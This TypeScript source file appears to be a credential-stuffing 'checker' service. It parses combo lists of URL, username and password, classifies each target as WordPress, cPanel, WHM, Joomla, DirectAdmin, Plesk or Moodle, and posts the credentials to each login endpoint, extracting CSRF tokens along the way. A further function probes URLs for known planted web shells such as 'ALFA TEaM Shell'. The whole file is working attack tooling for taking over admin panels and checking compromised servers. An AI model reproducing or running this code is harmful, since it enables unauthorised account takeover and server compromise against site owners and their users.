import { ComboLine, CMSType, CheckResult } from '../types';

export class CheckerService {
  private static instance: CheckerService;
  private abortController: AbortController | null = null;

  static getInstance(): CheckerService {
    if (!CheckerService.instance) {
      CheckerService.instance = new CheckerService();
    }
    return CheckerService.instance;
  }

  ensureValidScheme(url: string): string {
    url = url.trim();
    url = url.replace(/^(?:(?:https?:\/\/))+/gi, 'https://');
    if (!url.match(/^https?:\/\//i)) {
      url = 'https://' + url;
    }
    return url;
  }

  parseComboLine(line: string): ComboLine | null {
    try {
      line = line.trim();
      let url: string, username: string, password: string;

      if (line.includes('|')) {
        const parts = line.split('|', 3);
        if (parts.length !== 3) return null;
        [url, username, password] = parts;
      } else {
        const parts = line.split(':');
        if (parts.length < 3) return null;
        password = parts.pop()!;
        username = parts.pop()!;
        url = parts.join(':');
      }

      url = this.ensureValidScheme(url);
      return { url, username, password };
    } catch (error) {
      console.error('Error parsing combo line:', line, error);
      return null;
    }
  }

  getCMSType(url: string): CMSType {
    const lowerUrl = url.toLowerCase();
    
    if (lowerUrl.includes('wp-login.php')) return 'WordPress';
    if (lowerUrl.includes(':2083')) return 'cPanel';
    if (lowerUrl.includes(':2087')) return 'WHM';
    if (lowerUrl.includes('/administrator/index.php')) return 'Joomla';
    if (lowerUrl.includes(':2222')) return 'DirectAdmin';
    if (lowerUrl.includes('login_up.php')) return 'Plesk';
    if (lowerUrl.includes('/login/index.php') || lowerUrl.includes('moodle')) return 'Moodle';
    
    return 'Unknown';
  }

  async extractFromFiles(files: File[], onProgress?: (progress: number) => void): Promise<ComboLine[]> {
    const extractedLines: ComboLine[] = [];
    
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      const text = await file.text();
      const lines = text.split('\n');
      
      for (const line of lines) {
        if (line.trim()) {
          const parsed = this.parseComboLine(line);
          if (parsed) {
            extractedLines.push(parsed);
          }
        }
      }
      
      if (onProgress) {
        onProgress((i + 1) / files.length * 100);
      }
    }
    
    return extractedLines;
  }

  removeDuplicates(lines: ComboLine[]): ComboLine[] {
    const uniqueMap = new Map<string, ComboLine>();
    
    for (const line of lines) {
      const key = `${line.url}:${line.username}:${line.password}`;
      if (!uniqueMap.has(key)) {
        uniqueMap.set(key, line);
      }
    }
    
    return Array.from(uniqueMap.values());
  }

  async checkLogin(combo: ComboLine, timeout: number = 10): Promise<CheckResult> {
    const cmsType = this.getCMSType(combo.url);
    
    try {
      let isValid = false;
      
      // Simulate different CMS login checks
      switch (cmsType) {
        case 'WordPress':
          isValid = await this.checkWordPressLogin(combo, timeout);
          break;
        case 'cPanel':
          isValid = await this.checkCPanelLogin(combo, timeout);
          break;
        case 'Joomla':
          isValid = await this.checkJoomlaLogin(combo, timeout);
          break;
        case 'WHM':
          isValid = await this.checkWHMLogin(combo, timeout);
          break;
        case 'DirectAdmin':
          isValid = await this.checkDirectAdminLogin(combo, timeout);
          break;
        case 'Plesk':
          isValid = await this.checkPleskLogin(combo, timeout);
          break;
        case 'Moodle':
          isValid = await this.checkMoodleLogin(combo, timeout);
          break;
        default:
          isValid = false;
      }

      return {
        url: combo.url,
        username: combo.username,
        password: combo.password,
        cmsType,
        status: isValid ? 'valid' : 'invalid',
        timestamp: new Date().toISOString(),
      };
    } catch (error) {
      return {
        url: combo.url,
        username: combo.username,
        password: combo.password,
        cmsType,
        status: 'error',
        timestamp: new Date().toISOString(),
      };
    }
  }

  private async checkWordPressLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      const loginUrl = `${combo.url}/wp-login.php`;
      const formData = new FormData();
      formData.append('log', combo.username);
      formData.append('pwd', combo.password);
      formData.append('wp-submit', 'Log In');

      const response = await fetch(loginUrl, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(timeout * 1000),
      });

      const text = await response.text();
      return text.includes('Dashboard') || text.includes('WP File Manager') || text.includes('plugin-install.php');
    } catch {
      return false;
    }
  }

  private async checkCPanelLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      const loginUrl = `${combo.url}/login/`;
      const formData = new FormData();
      formData.append('user', combo.username);
      formData.append('pass', combo.password);

      const response = await fetch(`${loginUrl}?login_only=1`, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(timeout * 1000),
      });

      const result = await response.json();
      return result.status === 1;
    } catch {
      return false;
    }
  }

  private async checkJoomlaLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      // First get the token
      const response = await fetch(combo.url, {
        signal: AbortSignal.timeout(timeout * 1000),
      });
      
      const text = await response.text();
      const tokenMatch = text.match(/type="hidden" name="([a-f0-9]{32})" value="1"/);
      
      if (!tokenMatch) return false;

      const formData = new FormData();
      formData.append('username', combo.username);
      formData.append('passwd', combo.password);
      formData.append(tokenMatch[1], '1');
      formData.append('lang', 'en-GB');
      formData.append('option', 'com_login');
      formData.append('task', 'login');

      const loginResponse = await fetch(combo.url, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(timeout * 1000),
      });

      const loginText = await loginResponse.text();
      return loginText.includes('New Article') || loginText.includes('Control Panel');
    } catch {
      return false;
    }
  }

  private async checkWHMLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      const loginUrl = `${combo.url}/login/`;
      const formData = new FormData();
      formData.append('user', combo.username);
      formData.append('pass', combo.password);

      const response = await fetch(`${loginUrl}?login_only=1`, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(timeout * 1000),
      });

      const result = await response.json();
      return result.status === 1;
    } catch {
      return false;
    }
  }

  private async checkDirectAdminLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      const loginUrl = `${combo.url}/CMD_API_SUBDOMAIN?domain=all&json=yes`;
      
      const response = await fetch(loginUrl, {
        headers: {
          'Authorization': 'Basic ' + btoa(`${combo.username}:${combo.password}`)
        },
        signal: AbortSignal.timeout(timeout * 1000),
      });

      const result = await response.json();
      return typeof result === 'object' && result !== null;
    } catch {
      return false;
    }
  }

  private async checkPleskLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      const loginUrl = `${combo.url}/login_up.php`;
      const formData = new FormData();
      formData.append('login_name', combo.username);
      formData.append('passwd', combo.password);
      formData.append('locale_id', 'en-US');

      const response = await fetch(loginUrl, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(timeout * 1000),
      });

      return response.url.includes('/smb/web/');
    } catch {
      return false;
    }
  }

  private async checkMoodleLogin(combo: ComboLine, timeout: number): Promise<boolean> {
    try {
      const baseUrl = combo.url.replace('/login/index.php', '');
      const loginUrl = `${baseUrl}/login/index.php`;

      // Get login token
      const getResponse = await fetch(loginUrl, {
        signal: AbortSignal.timeout(timeout * 1000),
      });
      
      const getText = await getResponse.text();
      const tokenMatch = getText.match(/name="logintoken" value="([^"]+)"/);
      
      const formData = new FormData();
      formData.append('username', combo.username);
      formData.append('password', combo.password);
      if (tokenMatch) {
        formData.append('logintoken', tokenMatch[1]);
      }

      const response = await fetch(loginUrl, {
        method: 'POST',
        body: formData,
        signal: AbortSignal.timeout(timeout * 1000),
      });

      const text = await response.text();
      return !text.toLowerCase().includes('login/index.php') && 
             !text.toLowerCase().includes('invalidlogin') &&
             text.toLowerCase().includes('logout');
    } catch {
      return false;
    }
  }

  async checkShellStatus(url: string): Promise<'active' | 'inactive' | 'error'> {
    try {
      const response = await fetch(url, {
        signal: AbortSignal.timeout(10000),
      });
      
      if (response.ok) {
        const text = await response.text();
        if (text.includes('kom.php') || text.includes('ALFA TEaM Shell') || text.includes('Tesla')) {
          return 'active';
        }
      }
      return 'inactive';
    } catch {
      return 'error';
    }
  }

  startChecking() {
    this.abortController = new AbortController();
  }

  stopChecking() {
    if (this.abortController) {
      this.abortController.abort();
      this.abortController = null;
    }
  }
}